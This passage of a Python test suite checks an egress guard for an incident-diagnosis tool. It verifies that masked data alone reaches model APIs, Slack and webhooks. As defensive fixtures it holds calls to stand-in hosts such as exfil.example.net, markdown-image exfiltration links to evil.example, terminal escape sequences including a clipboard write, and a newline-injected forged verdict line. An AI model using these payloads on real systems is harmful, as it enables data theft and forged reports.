"""Egress (owner, 2026-10-20): every destination on one inventory, nothing unmasked leaves, every egress recorded.

Canaries are built from parts (tests/fakes.py's rule): no tracked file holds a value of the shape it stands for.

The outbound gate's own ways out (audit A-C-8, A-C-9) are held here too, at the end: stdout, the --json report file,
MCP results and errors, and the deployed-source block in a report (Slack/Teams/webhook: tests/test_gate.py).
"""

from __future__ import annotations

import ipaddress
import json
import logging
import pathlib
import re
import subprocess
import sys
import textwrap

import pytest

from fakes import AWS_ACCESS_KEY_ID, HUNTER2
from warden import egress, mcp_server, providers
from warden.audit import AuditLog
from warden.cli import main
from warden.egress import EgressBlocked
from warden.models import Alert, ContextBundle, Severity
from warden.reporting import build_report

ROOT = pathlib.Path(__file__).resolve().parents[1]
SRC = ROOT / "src" / "warden"

EMAIL = "canary.person" + "@" + "example.org"
IP = "203.0.113." + "77"
PHONE = "+1 415 555 " + "0142"
ACCOUNT = "1234" + "56789012"
CANARIES = (EMAIL, IP, PHONE, ACCOUNT)

# Every module that opens a network client, and the destinations it may reach (egress.destinations()). A module that
# starts opening one is a new egress: it must be added here AND covered by egress.py (a destination, and a check).
INVENTORY = {
    "audit.py": {"database", "aws"},  # the audit (psycopg, an IAM token from RDS), KMS signing
    "aws_docs.py": {"aws-docs"},
    "aws_stack.py": {"aws"},  # boto3 reads, and a Lambda's deployment package from its presigned S3 address
    "changes.py": {"github"},
    "chatops.py": {"slack", "slack-webhook", "teams-webhook", "generic-webhook", "pagerduty"},
    "database.py": {"database"},
    "datadog.py": {"datadog"},
    "discuss.py": {"slack"},
    "findings.py": {"github", "sonarcloud"},  # code review's findings on the deployed pull requests (GET)
    "grafana.py": {"grafana"},
    "k8s_backend.py": {"aws", "in-network"},
    "landed.py": {"github"},  # B21: deployments and merged pull requests since a fix, before its undo (GET)
    "lambdas.py": {"aws", "database"},
    "observability.py": {"tracing"},
    "paging.py": {"aws"},  # CloudWatch's metric of a page sent, the page's S3 record
    "platforms/__init__.py": {"aws"},  # a session in the watched account (STS)
    "platforms/aws.py": {"aws"},
    "platforms/db.py": {"aws", "database"},
    "platforms/k8s.py": {"aws", "in-network"},
    "platforms/infra.py": {"github"},  # B17: the infra workflow's runs, branch head and its apply-plan dispatch
    "providers.py": {"anthropic", "openai", "groq", "openrouter", "gemini", "model-api", "aws"},
    "runtime.py": {"aws"},
    "runtime_base.py": {"aws", "temporal"},
    "settings.py": {"aws"},
    "slack_login.py": {"slack"},
    "timeline.py": {"github"},
    "webhooks.py": {"datadog", "alertmanager"},
    # The one https opener (redirects stay on the server asked): it reaches what its callers above name.
    "web.py": {"github", "slack", "slack-webhook", "teams-webhook", "generic-webhook", "pagerduty", "datadog",
               "grafana", "alertmanager"},
}
_CLIENT = re.compile(
    r"urlopen\(|urllib\.request\.Request\(|\bhttpx\.|import httpx|\brequests\.(?:get|post|put|Session)|aiohttp|slack_sdk"
    r"|socket\.socket\(|create_connection\(|subprocess\.(?:run|Popen|call|check_output)|Anthropic\(|OpenAI\("
    r"|genai\.Client|OTLPSpanExporter\(|boto3\.client\(|boto3\.Session\(|psycopg\.connect|pymysql\.connect"
    r"|redis\.from_url|redis\.Redis\(|MongoClient|pymssql\.connect|kubernetes\.client|from kubernetes import")
_CONFIGURED_NAMES = {name for _, name, *_ in egress._CONFIGURED} | {"database"}


def _modules_with_clients() -> set[str]:
    return {p.relative_to(SRC).as_posix() for p in SRC.rglob("*.py")
            if p.name != "egress.py" and _CLIENT.search(p.read_text(encoding="utf-8"))}


def test_every_module_that_opens_a_network_client_is_on_the_inventory():
    """A new outbound call in a new module fails here until it is named - the static half of 'nothing bypasses it'."""
    assert _modules_with_clients() == set(INVENTORY)


def test_the_inventory_names_only_destinations_egress_knows():
    known = {d.name for d in egress.STATIC} | _CONFIGURED_NAMES
    assert set().union(*INVENTORY.values()) <= known


def test_every_registered_model_provider_is_guarded():
    for cls in set(providers._REGISTRY.values()):
        assert getattr(cls.complete, "warden_egress", False), cls.__name__


class _Spy:
    """A model client that records whether anything reached it."""

    def __init__(self):
        self.calls = []

    def create(self, **kw):
        self.calls.append(kw)
        raise AssertionError("the prompt reached the model")


@pytest.mark.parametrize("canary", CANARIES)
def test_a_prompt_with_any_raw_value_never_reaches_the_model(canary, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "x")
    provider = providers.AnthropicProvider(model="claude-sonnet-5")
    spy = _Spy()
    provider._client = type("C", (), {"messages": spy})()
    with pytest.raises(EgressBlocked) as caught:
        provider.complete(system="You diagnose.", user=f"ERROR checkout user={canary} timed out")
    assert spy.calls == []
    assert canary not in str(caught.value)
    assert caught.value.sent is False
    assert caught.value.status_code == 0


def test_a_masked_prompt_is_sent_and_recorded_without_its_text(monkeypatch, caplog):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "x")
    provider = providers.AnthropicProvider(model="claude-sonnet-5")
    sent = []

    class Messages:
        def create(self, **kw):
            sent.append(kw)
            usage = type("U", (), {"input_tokens": 1, "output_tokens": 1})()
            text = type("B", (), {"type": "text", "text": "{}"})()
            return type("R", (), {"content": [text], "usage": usage, "stop_reason": "end_turn"})()

    provider._client = type("C", (), {"messages": Messages()})()
    with caplog.at_level(logging.INFO, logger="warden.egress"):
        provider.complete(system="You diagnose.", user="ERROR checkout user=<EMAIL_1> src=<IPV4_1> secret-word")
    assert len(sent) == 1
    [line] = [r.getMessage() for r in caplog.records if r.name == "warden.egress"]
    row = json.loads(line.removeprefix("egress "))
    assert row["destination"] == "anthropic"
    assert row["verdict"] == "PASS"
    assert row["placeholders"] == {"EMAIL": 1, "IPV4": 1}
    assert "secret-word" not in line
    assert "checkout" not in line


def test_the_model_guard_holds_for_eldanes_way_of_building_a_provider():
    """Eldane builds its provider from the registry directly (never resolve()): the guard is on the class."""
    cls = providers._REGISTRY["claude_cli"]
    provider = cls.__new__(cls)  # no CLI needed: the guard runs before the subprocess is started
    with pytest.raises(EgressBlocked):
        provider.complete(system="s", user=f"user {EMAIL}")


# --------------------------------------------------------------------------- the request check

def _slack(text: str) -> bytes:
    return json.dumps({"channel": "C0123456", "text": text, "thread_ts": "1700000000.000200"}).encode()


JSON = {"Content-Type": "application/json"}
SLACK_API = "https://slack.com/api/chat.postMessage"


def test_an_unlisted_host_is_refused():
    with pytest.raises(EgressBlocked, match="no destination"):
        egress.check_request("https://exfil.example.net/x", None, {}, "GET")
    with pytest.raises(EgressBlocked):
        egress.check_host("exfil.example.net")
    public = str(ipaddress.IPv4Address(0x09090909))  # a public address no destination names
    with pytest.raises(EgressBlocked):
        egress.check_host(public)


@pytest.mark.parametrize("canary", CANARIES)
def test_a_slack_message_holding_a_raw_value_is_refused(canary):
    body = _slack(f"user {canary} failed")
    with pytest.raises(EgressBlocked) as caught:
        egress.check_request(SLACK_API, body, JSON, "POST")
    assert canary not in str(caught.value)


def test_a_masked_slack_message_passes_and_is_recorded(tmp_path):
    log = AuditLog(tmp_path / "a.db")
    egress.ledger_to(log)
    try:
        egress.check_request("https://slack.com/api/chat.postMessage",
                             _slack("user <EMAIL_1> failed at 2026-10-20T06:00:00Z"), JSON, "POST")
    finally:
        egress.forget(log)
    [row] = log.entries(kinds=(egress.SENT,))
    body = row["body"]
    assert body["destination"] == "slack"
    assert body["purpose"] == "POST /api/chat.postMessage"
    assert body["placeholders"] == {"EMAIL": 1}
    assert len(body["sha256"]) == 64


def test_an_egress_the_audit_cannot_hold_is_not_made(tmp_path):
    class Broken:
        def append(self, *_a):
            raise OSError("the audit is down")

    broken = Broken()
    egress.ledger_to(broken)
    try:
        body = _slack("ok")
        with pytest.raises(EgressBlocked, match="ledger row"):
            egress.check_request(SLACK_API, body, JSON, "POST")
    finally:
        egress.forget(broken)


def test_identifiers_an_operator_could_show_are_not_shown_in_slack():
    """gate.G5 lets emails, tenants and IPs through for WARDEN_REPORT_SHOW_IDENTIFIERS; the egress check does not."""
    hook = "https://hooks.slack.com/" + "services/T0/B0/x"
    for value in (EMAIL, IP, "tenant_id=" + "acme-42"):
        body = _slack(value)
        with pytest.raises(EgressBlocked):
            egress.check_request(hook, body, JSON, "POST")


def test_wardens_own_approval_link_is_the_one_capability_that_may_go_to_slack(monkeypatch):
    monkeypatch.setenv("WARDEN_APPROVAL_RP_ID", "approve.example.org")
    link = "https://approve.example.org/a/" + "Ab3" * 14 + "x"
    blocks = {"channel": "C0123456", "blocks": [{"type": "actions", "elements": [{"type": "button", "url": link}]}]}
    egress.check_request("https://slack.com/api/chat.postMessage", json.dumps(blocks).encode(), JSON, "POST")
    monkeypatch.setenv("WARDEN_APPROVAL_RP_ID", "elsewhere.example.org")
    body = json.dumps(blocks).encode()
    with pytest.raises(EgressBlocked):  # the same token on any other address is a token
        egress.check_request(SLACK_API, body, JSON, "POST")


def test_a_destinations_own_credential_fields_go_to_it():
    form = {"Content-Type": "application/x-www-form-urlencoded"}
    secret = "Ab3Cd4" * 8
    egress.check_request("https://slack.com/api/openid.connect.token",
                         f"client_id={ACCOUNT}.{ACCOUNT}&client_secret={secret}&code={secret}".encode(), form, "POST")
    egress.check_request("https://events.pagerduty.com/v2/enqueue",
                         json.dumps({"routing_key": secret, "payload": {"summary": "inc-1 down"}}).encode(), JSON, "POST")
    leak = json.dumps({"routing_key": "k", "payload": {"summary": secret}}).encode()
    with pytest.raises(EgressBlocked):  # the same value in any other field is a leak
        egress.check_request("https://events.pagerduty.com/v2/enqueue", leak, JSON, "POST")


def test_a_query_is_checked_and_a_number_in_it_is_a_number():
    egress.check_request("https://api.datadoghq.com/api/v1/query?from=1760940000&to=1760943600&query=avg:x", None,
                         {}, "GET")
    with pytest.raises(EgressBlocked):
        egress.check_request(f"https://api.github.com/search?q={EMAIL}", None, {}, "GET")


def test_the_private_network_is_not_content_checked():
    """The private network is inside: recorded on connect, not scanned. (A urllib body to an AWS name is: below.)"""
    egress.check_request("http://10.0.3.22:8080/x", f"user {EMAIL}".encode(), {}, "POST")
    egress.check_host("169.254.170.2")  # the ECS task's credentials


def test_a_webhook_path_is_never_on_the_ledger(caplog):
    with caplog.at_level(logging.INFO, logger="warden.egress"):
        egress.check_request("https://hooks.slack.com/" + "services/T0SECRET/B0SECRET/XSECRETXSECRET", _slack("ok"),
                             JSON, "POST")
    assert "SECRET" not in caplog.text
    assert "/services" in caplog.text


def test_configured_addresses_are_their_destinations(monkeypatch):
    monkeypatch.setenv("WARDEN_WEBHOOK_URL", "https://hooks.example.net/in/abc")
    monkeypatch.setenv("WARDEN_AUDIT_DSN", "postgresql://w@audit.cluster-x.example.net:5432/warden")
    assert egress.destination_of("hooks.example.net").name == "generic-webhook"
    assert egress.destination_of("audit.cluster-x.example.net").name == "database"
    monkeypatch.delenv("WARDEN_WEBHOOK_URL")
    assert egress.destination_of("hooks.example.net") is None


# --------------------------------------------------------------------------- the interpreter hook, for real

_HOOKED = textwrap.dedent("""
    import json, socket, sys, urllib.request
    from warden import egress
    egress.install()
    out = {}
    def attempt(name, fn):
        try:
            fn()
            out[name] = "sent"
        except egress.EgressBlocked as exc:
            out[name] = "blocked"
        except OSError as exc:
            out[name] = "network:" + type(exc).__name__
    email = "canary.person" + "@" + "example.org"
    attempt("unlisted_lookup", lambda: socket.getaddrinfo("exfil.example.net", 443))
    attempt("unlisted_urlopen", lambda: urllib.request.urlopen("https://exfil.example.net/x", timeout=2))
    req = urllib.request.Request("https://slack.com/api/chat.postMessage", method="POST",
                                 data=json.dumps({"text": "user " + email}).encode(),
                                 headers={"Content-Type": "application/json"})
    attempt("raw_value_to_slack", lambda: urllib.request.urlopen(req, timeout=2))
    opener = urllib.request.build_opener()
    attempt("own_opener", lambda: opener.open(req, timeout=2))
    attempt("in_network_lookup", lambda: socket.getaddrinfo("localhost", 1))
    print(json.dumps(out))
""")


def test_the_hook_refuses_before_any_connection_in_a_real_interpreter():
    """No network is needed for this to pass: every refusal happens before a name is looked up."""
    got = subprocess.run([sys.executable, "-c", _HOOKED], capture_output=True, text=True, timeout=60, check=True)
    out = json.loads(got.stdout.strip().splitlines()[-1])
    assert out["unlisted_lookup"] == "blocked"
    assert out["unlisted_urlopen"] == "blocked"
    assert out["raw_value_to_slack"] == "blocked"
    assert out["own_opener"] == "blocked"  # any OpenerDirector, not only urlopen's
    assert out["in_network_lookup"] == "sent"
    assert "canary.person" not in got.stderr  # the ledger's lines name kinds, never values


def test_the_hook_checks_once_installed_and_not_while_off(monkeypatch):
    """install() turns the hook on; off (only the test suite's conftest sets it so, between tests) it checks nothing."""
    monkeypatch.setitem(egress._STATE, "installed", True)  # never add a real audit hook to the test process
    monkeypatch.setitem(egress._STATE, "on", False)
    egress._hook("socket.getaddrinfo", ("exfil.example.net", 443))  # off: not checked
    egress.install()
    assert egress._STATE["on"] is True
    with pytest.raises(EgressBlocked):
        egress._hook("socket.getaddrinfo", ("exfil.example.net", 443))


def test_install_for_environment_leaves_a_demo_alone(monkeypatch):
    monkeypatch.delenv("WARDEN_ENV", raising=False)
    assert egress.install_for_environment() is False


def test_a_proxy_is_looked_up_and_what_goes_through_it_is_still_checked(monkeypatch):
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.corp.example:3128")
    egress.check_host("proxy.corp.example")
    body = _slack(f"user {EMAIL}")
    with pytest.raises(EgressBlocked):  # urllib names the real address, which is checked as ever
        egress.check_request(SLACK_API, body, JSON, "POST")


def test_a_body_to_an_aws_name_is_checked_and_a_presigned_query_is_not(monkeypatch):
    """A urllib request to an AWS name is checked like one outside (review); AWS's own presigned parameters are not."""
    monkeypatch.setenv("WARDEN_AUDIT_ANCHOR_BUCKET", "warden-dev-anchors")
    body = f"user {EMAIL}".encode()
    with pytest.raises(EgressBlocked):
        egress.check_request("https://warden-dev-anchors.s3.ap-south-2.amazonaws.com/x", body, {}, "PUT")
    # GetFunction's code location: AWS's own bucket, the account's id in the path, a presigned query.
    egress.check_request("https://awslambda-ap-south-2-tasks.s3.ap-south-2.amazonaws.com/snapshots/" + ACCOUNT +
                         "/orders-api-0d1f2e3a?versionId=3sL4kqtJlcpXroDTDmJ.rmSpXd3dIbrH&X-Amz-Credential=" + "ASIA" +
                         "Q" * 16 + "&X-Amz-Security-Token=" + "IQoJ" + "b3" * 40, None, {}, "GET")
    with pytest.raises(EgressBlocked):
        egress.check_request(f"https://sts.ap-south-2.amazonaws.com/?note={EMAIL}", None, {}, "GET")


def test_a_body_that_cannot_be_read_without_consuming_it_is_refused():
    import io

    stream = io.BytesIO(b"{}")
    with pytest.raises(EgressBlocked, match="cannot be checked"):
        egress.check_request(SLACK_API, stream, JSON, "POST")


def test_wardens_own_link_inside_a_line_of_text_is_its_own(monkeypatch):
    """Teams and a generic webhook carry the approval link inside the message's text (`label: link`)."""
    monkeypatch.setenv("WARDEN_APPROVAL_RP_ID", "approve.example.org")
    link = "https://approve.example.org/a/" + "Ab3" * 14 + "x"
    egress.check_request("https://x.webhook.office.com/" + "webhookb2/a", json.dumps({"text": f"Approve: {link}"}).encode(),
                         JSON, "POST")


def test_closing_the_newer_log_gives_the_rows_back_to_the_older_one_still_open(tmp_path):
    first, second = AuditLog(tmp_path / "a.db"), AuditLog(tmp_path / "b.db")
    egress.ledger_to(first)
    egress.ledger_to(second)
    second.close()
    try:
        egress.check_request(SLACK_API, _slack("ok"), JSON, "POST")
        rows = first.entries(kinds=(egress.SENT,))
    finally:
        first.close()
    assert len(rows) == 1
    assert "audit" not in egress._SINK


def test_a_model_host_on_no_destination_is_refused_not_renamed():
    """Review: an OpenAI-shaped provider pointed at an unlisted host was recorded as `model:openai` and sent where
    the hook was not installed. Its host must be a destination; a provider with no host is named as itself."""
    class Unlisted:
        name, model, base_url = "openai", "m", "https://llm.example.net/v1"

    unlisted = Unlisted()
    with pytest.raises(EgressBlocked, match="no destination"):
        egress.guard_model(unlisted, "s", "u")

    class InProcess:
        name, model = "replay", "m"

    egress.guard_model(InProcess(), "s", "u")


def test_the_approver_list_alarm_closes_its_audit_log(monkeypatch):
    """Review: the approvers-changed path left its audit log open as the egress ledger's sink after a failed write."""
    from warden import lambdas, runtime

    class Log:
        closed = False

        def append(self, *_a):
            raise OSError("the audit is down")

        def close(self):
            Log.closed = True

    monkeypatch.setattr(runtime, "open_audit", Log)

    class _CW:
        def put_metric_data(self, **_kw):
            return {}

    import boto3

    monkeypatch.setattr(boto3, "client", lambda *_a, **_kw: _CW())
    monkeypatch.setenv("AWS_REGION", "us-east-1")
    got = lambdas._approvers_changed({"eventName": "PutParameter", "userIdentity": {"type": "Root"}})
    assert got["approver_list_changed"] is True
    assert Log.closed is True


def test_a_closed_log_takes_no_more_rows(tmp_path):
    log = AuditLog(tmp_path / "a.db")
    egress.ledger_to(log)
    log.close()
    egress.check_request("https://slack.com/api/chat.postMessage", _slack("ok"), JSON, "POST")  # not refused
    assert "audit" not in egress._SINK


def test_an_openai_shaped_provider_is_named_by_its_host(monkeypatch):
    monkeypatch.setenv("GROQ_API_KEY", "x")
    provider = providers.OpenAICompatProvider(model="m", base_url="https://api.groq.com/openai/v1")
    assert egress._model_destination(provider).name == "groq"


def test_the_model_call_thread_keeps_the_callers_context():
    """The ledger names the incident from the Temporal activity's context; the call runs on a thread of its own."""
    import contextvars

    from warden.llm import _complete_within

    var = contextvars.ContextVar("v", default="lost")
    var.set("kept")

    class P:
        def complete(self, **_kw):
            return var.get()

    assert _complete_within(P(), system="s", user="u", seconds=5) == "kept"


def test_a_security_findings_text_reaches_no_outbound_payload_raw():
    """GuardDuty and Security Hub findings (#52) are a new inbound source: the attacker's address, a canary in the
    finding's own words - none of it is in the alert, the evidence a model would be shown, or a Slack body made of it."""
    from test_security_intake import _guardduty
    from warden import security_findings
    from warden.activities import IncidentActivities

    ev = security_findings.finding_event(_guardduty(description=f"contact {EMAIL} from {IP}, account {ACCOUNT}"))
    pack = IncidentActivities(audit=AuditLog(":memory:")).prepare(ev.alert.model_copy(update={"alert_id": "sec-1"}))
    assert "<EMAIL_" in ev.alert.summary  # the finding's own words were read, masked
    for text in (ev.alert.summary, ev.rule, ev.escalate, pack.prompt, pack.model_dump_json()):
        assert all(c not in text for c in CANARIES)
    assert egress.kinds_in(pack.prompt) == []
    egress.check_request(SLACK_API, _slack(ev.alert.summary), JSON, "POST")  # what the report would carry passes


def test_aws_service_endpoints_are_looked_up_and_the_news_feeds_are_read():
    """The reachability analysis (#92) resolves a database endpoint to an address - a lookup, nothing sent; the AWS
    updates watch (#83) reads AWS's feeds with a GET and no payload."""
    egress.check_host("orders.cluster-ro-c1x2y3z4.ap-south-2.rds.amazonaws.com")
    egress.check_host("master.carts-cache.abc123.aps2.cache.amazonaws.com")  # the cache's own reads (#151)
    for feed in ("https://aws.amazon.com/about-aws/whats-new/recent/feed/", "https://aws.amazon.com/blogs/aws/feed/"):
        egress.check_request(feed, None, {"User-Agent": "warden"}, "GET")
    assert egress.destination_of("aws.amazon.com").name == "aws-news"
    assert egress.destination_of("evil.amazon.com") is None


def test_code_review_findings_are_read_from_listed_destinations_only():
    """The findings reader (#41) GETs api.github.com and sonarcloud.io: both are destinations, so its reads pass the
    hook; the query is checked like any outside one."""
    from warden.findings import FindingsReader

    hosts: list[str] = []

    class _Answer:
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def read(self, _n):
            return b"[]"

    def opener(req, timeout):
        egress.check_request(req.full_url, req.data, dict(req.header_items()), req.get_method())
        hosts.append(egress.destination_of(req.host.split(":")[0]).name)
        return _Answer()

    reader = FindingsReader(None, repo="octo/app", sonar_project="octo_app", opener=opener)
    reader._deadline = float("inf")
    reader._sonar_issues(7)
    reader._scanning_alerts(7)
    assert hosts == ["sonarcloud", "github"]
    with pytest.raises(EgressBlocked, match="no destination"):  # a look-alike of the host is still on none
        egress.check_request("https://sonarcloud.io.example.net/api/issues/search?ps=5", None, {}, "GET")
    assert egress.kinds_in("componentKeys=octo_app&pullRequest=7&issueStatuses=OPEN,CONFIRMED,ACCEPTED&ps=20") == []


_REQUESTS = textwrap.dedent("""
    import os, sys
    os.environ["OTEL_EXPORTER_OTLP_ENDPOINT"] = "https://otlp.collector.example"
    os.environ.pop("HTTPS_PROXY", None); os.environ.pop("https_proxy", None)
    import requests
    from warden import egress
    egress.install()
    for host in ("otlp.collector.example", "exfil.example.net"):
        try:
            requests.post("https://" + host + "/v1/traces", data=b"spans", timeout=2)
        except Exception as exc:
            chain, e = [], exc
            while e is not None and len(chain) < 10:
                chain.append(type(e).__name__); e = e.__cause__ or e.__context__
            print(host, "EgressBlocked" in chain)
""")


def test_a_client_other_than_urllib_is_held_by_the_name_lookup():
    """The OTLP exporter sends with `requests` since opentelemetry 1.45.1 (#126): no urllib event, so the name lookup
    is its guard - the configured collector may be looked up, any other host is refused before it is resolved."""
    got = subprocess.run([sys.executable, "-c", _REQUESTS], capture_output=True, text=True, timeout=60, check=True)
    lines = dict(line.split() for line in got.stdout.strip().splitlines())
    assert lines["otlp.collector.example"] == "False"  # looked up (and then unreachable here), not refused
    assert lines["exfil.example.net"] == "True"


def test_review_round_three_lookups_mapped_addresses_and_record_links(monkeypatch):
    """A mapped public IPv4 is that IPv4; a listener's own lookup is no egress; every socket lookup event is held; a
    record link's id is scanned like text."""
    import socket

    public = str(ipaddress.IPv4Address(0x09090909))
    # As on the Python releases that call a mapped public address non-global: it is judged as its IPv4.
    monkeypatch.setattr(ipaddress.IPv6Address, "is_global", property(lambda self: False))
    assert egress.destination_of("::ffff:" + public) is None
    egress.check_host(None)
    egress.check_host("")
    assert {"socket.gethostbyname", "socket.gethostbyname_ex", "socket.gethostbyaddr"} <= egress._EVENTS
    assert socket.gethostbyname  # the events these name exist in this Python
    monkeypatch.setenv("WARDEN_APPROVAL_RP_ID", "approve.example.org")
    hidden = json.dumps({"text": "see https://approve.example.org/r/" + "10.0.4." + "21"}).encode()
    with pytest.raises(EgressBlocked):
        egress.check_request(SLACK_API, hidden, JSON, "POST")
    fine = json.dumps({"text": "see https://approve.example.org/r/50ac32d0fe243384-20261014T071413Z"}).encode()
    egress.check_request(SLACK_API, fine, JSON, "POST")


# --------------------------------------------------------------------------- the outbound gate's other ways out

KEY = AWS_ACCESS_KEY_ID
PASSWORD = HUNTER2 * 2


def _alert_file(tmp_path, **kw):
    alert = dict(alert_id="eg-1", name="Checkout\x1b[2J\x1b]8;;https://evil.example\x07errors", severity="high",
                 service="checkout", environment="staging", summary=f"5xx; leaked key {KEY}",
                 started_at="2026-09-28T10:00:00Z", **kw)
    path = tmp_path / "alert.json"
    path.write_text(json.dumps(alert), encoding="utf-8")
    return path


def test_stdout_carries_no_escape_sequence_and_no_secret(tmp_path, capsys):
    main(["run", "--alert", str(_alert_file(tmp_path)), "--report"])
    out = capsys.readouterr().out
    assert "\x1b" not in out
    assert "\x07" not in out
    assert KEY not in out


def test_the_json_report_file_holds_no_secret(tmp_path, capsys):
    target = tmp_path / "r.json"
    main(["run", "--alert", str(_alert_file(tmp_path)), "--json", str(target)])
    text = target.read_text(encoding="utf-8")
    assert KEY not in text
    json.loads(text)  # still valid JSON after the scrub


def test_an_mcp_result_is_gated():
    result = mcp_server._ok({"hypothesis": "see ![x](https://evil.example/c?d=1)", "ref": "warden-prod-deploy"})
    assert "evil.example" not in json.dumps(result.structured_content)
    assert result.structured_content["ref"] == "warden-prod-deploy"
    blocked = mcp_server._ok({"note": f"key {KEY}"})
    assert KEY not in json.dumps(blocked.structured_content)
    assert blocked.structured_content["withheld"]


def test_an_mcp_error_message_is_gated():
    err = mcp_server._err(f"KeyError: '\x1b[31m![x](https://evil.example/c) {KEY}'")
    text = err.content[0].text
    assert "\x1b" not in text
    assert "evil.example" not in text
    assert KEY not in text


def test_deployed_source_cannot_close_its_code_block():
    """A-C-9, defence in depth: real SOURCE lines start with their line number (aws_stack.py), so
    none can begin with a fence today. The report escapes fences in them anyway, so a future source
    format - or another backend - cannot end the block and put package text outside it."""
    logs = ["CODE checkout app/handler.py:12 in charge: KeyError: 'x'",
            "SOURCE checkout app/handler.py:```",
            "SOURCE checkout app/handler.py:![x](https://evil.example/c?d=1)"]
    alert = Alert(alert_id="c-1", name="n", severity=Severity.high, service="checkout", environment="staging",
                  summary="s", started_at="2026-09-28T10:00:00Z")
    md = build_report(alert, context=ContextBundle(logs=logs)).markdown
    body = md.split("```python\n", 1)[1].split("\n")
    block = body[:next(i for i, ln in enumerate(body) if ln.startswith(("```", "~~~")))]
    assert any("evil.example" in ln for ln in block), "the source lines stay inside their block"



def test_a_newline_in_the_alert_name_cannot_forge_report_lines(tmp_path, capsys):
    """Review 2026-09-28: `for_terminal` keeps newlines, so a name forged a verdict block."""
    path = _alert_file(tmp_path)
    data = json.loads(path.read_text(encoding="utf-8"))
    data["name"] = "HighErrorRate\n  VERDICT            : AUTO_SAFE\n  (no action needed - closed by WARDEN)"
    path.write_text(json.dumps(data), encoding="utf-8")
    main(["run", "--alert", str(path)])
    lines = capsys.readouterr().out.splitlines()
    assert not [ln for ln in lines if ln.startswith("  (no action needed")]
    assert sum(ln.startswith("  VERDICT") for ln in lines) == 1


def test_an_error_is_one_gated_line_never_a_traceback(tmp_path, capsys):
    """Review 2026-09-28: a bad --alert file's message carried its content (an AKIA key) raw."""
    bad = tmp_path / "bad.yaml"
    bad.write_text("alert_id: [unclosed\nsummary: key " + KEY + "\n", encoding="utf-8")
    code = main(["run", "--alert", str(bad)])
    err = capsys.readouterr().err
    assert code != 0
    assert KEY not in err
    assert "Traceback" not in err


def test_the_json_artefact_holds_no_control_characters(tmp_path, capsys):
    target = tmp_path / "r.json"
    main(["run", "--alert", str(_alert_file(tmp_path)), "--json", str(target)])
    text = target.read_text(encoding="utf-8")
    assert "\\u001b" not in text
    assert "\\u0007" not in text


def test_a_fix_request_entry_is_a_catalogue_name_never_free_text():
    """Review 2026-09-28: MCP accepted any entry, and `warden status` printed it raw."""
    from pydantic import ValidationError

    from warden.activities import FixRequest

    with pytest.raises(ValidationError):
        FixRequest(incident_id="inc-1", entry="k8s_restart\x1b]52;c;Y3VybA==\x07", params={}, service="s", environment="dev")
    assert FixRequest(incident_id="inc-1", entry="k8s_restart", params={}, service="s", environment="dev").entry == "k8s_restart"


def test_a_span_records_the_error_scrubbed_and_bounded(monkeypatch):
    """Review 2026-09-28: the SDK recorded exception text raw on the span - keys, escapes, links."""
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.export import SimpleSpanProcessor
    from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter

    from warden import observability

    exporter = InMemorySpanExporter()
    provider = TracerProvider()
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    monkeypatch.setattr(observability, "tracer", lambda: provider.get_tracer("t"))
    with pytest.raises(RuntimeError), observability.span("diagnose"):
        raise RuntimeError(f"refused \x1b]52;c;Y3VybA==\x07 password={PASSWORD} {KEY}")
    (sp,) = exporter.get_finished_spans()
    everything = repr(sp.status) + repr([(e.name, dict(e.attributes)) for e in sp.events])
    for bad in ("\x1b", PASSWORD, KEY):
        assert bad not in everything, bad
    assert sp.status.description == "RuntimeError"


def test_a_failed_tool_span_records_the_error_scrubbed_and_bounded(monkeypatch):
    """Review 2A defect 5: `warden.tool.error` was redacted only - an escape sequence and a markdown
    image in a backend exception reached the tracing backend verbatim."""
    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.export import SimpleSpanProcessor
    from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter

    from warden import observability, tools
    from warden.models import Alert

    exporter = InMemorySpanExporter()
    provider = TracerProvider()
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    monkeypatch.setattr(observability, "tracer", lambda: provider.get_tracer("t"))

    class _Boom(tools.FixtureBackend):
        def logs(self, alert):
            raise RuntimeError("denied \x1b]52;c;Y3VybA==\x07 password=" + PASSWORD + " " + "x" * 2000)

    alert = Alert(alert_id="a", name="n", severity="high", service="checkout", environment="staging",
                  summary="s", started_at="2026-09-28T10:00:00Z")
    tools.gather(alert, _Boom())
    [err] = [s.attributes["warden.tool.error"] for s in exporter.get_finished_spans() if s.name == "tool.logs"]
    assert "\x1b" not in err, err
    assert PASSWORD not in err, err
    assert len(err) < 400, err


def test_the_worker_log_is_gated(capsys):
    """Review 2A defect 6: temporalio logs a failed activity with exc_info, and with no handler the
    last-resort one printed the raw exception text - escapes and secrets - to stderr."""
    import logging

    from warden import cli

    root = logging.getLogger()
    saved = root.handlers[:], root.level
    try:
        cli._install_log_gate()
        try:
            raise RuntimeError("model refused: \x1b]52;c;Y3VybA==\x07 password=" + PASSWORD + " " + "y" * 20000)
        except RuntimeError:
            logging.getLogger("temporalio.activity").warning("Completing activity as failed", exc_info=True)
        err = capsys.readouterr().err
        assert "Completing activity as failed" in err
        assert "Traceback" in err
        assert "\x1b" not in err
        assert PASSWORD not in err
        assert len(err) < 10000
    finally:
        root.handlers[:], _ = saved
        root.setLevel(saved[1])


# Third review (2026-09-30), egress residuals.
_KEY = AWS_ACCESS_KEY_ID  # AWS's documented example key


def test_a_secret_on_the_cut_is_never_printed_in_part():
    """Cut first, then redacted: a key straddling the cut left a prefix the redactor no longer knew."""
    import logging

    from warden.observability import GatedFormatter, _safe_error

    assert "AKIA" not in _safe_error(RuntimeError("x" * 290 + " " + _KEY))
    record = logging.LogRecord("t", logging.WARNING, __file__, 1, "y" * 7990 + " " + _KEY, None, None)
    assert "AKIA" not in GatedFormatter("%(message)s").format(record)
    long = logging.LogRecord("t", logging.WARNING, __file__, 1, "z" * 63990 + " " + _KEY + " tail", None, None)
    assert "AKIA" not in GatedFormatter("%(message)s").format(long)


def test_a_logged_message_cannot_pass_for_a_log_line_of_its_own():
    import logging

    from warden.observability import GatedFormatter

